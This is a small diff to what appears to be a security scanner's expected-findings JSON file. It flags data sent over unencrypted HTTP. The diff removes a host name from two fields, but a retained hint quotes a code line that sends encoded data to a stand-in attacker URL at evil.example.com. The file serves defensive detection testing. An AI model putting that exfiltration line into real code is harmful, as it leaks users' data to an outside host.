@@ -103,9 +103,9 @@
         "line": 7,
         "column": 0
       },
-      "item": "evil.example.com",
+      "item": null,
       "hint": "cleartext send \"http://evil.example.com/collect?d=\" + encodeURIComponent(data)",
-      "message": "Data is sent over an unencrypted connection to evil.example.com. All data must travel over an encrypted channel - use https:// (or wss:// for sockets), never http://, ws:// or ftp://."
+      "message": "Data is sent over an unencrypted connection. All data must travel over an encrypted channel - use https:// (or wss:// for sockets), never http://, ws:// or ftp://."
     }
   ]
 }
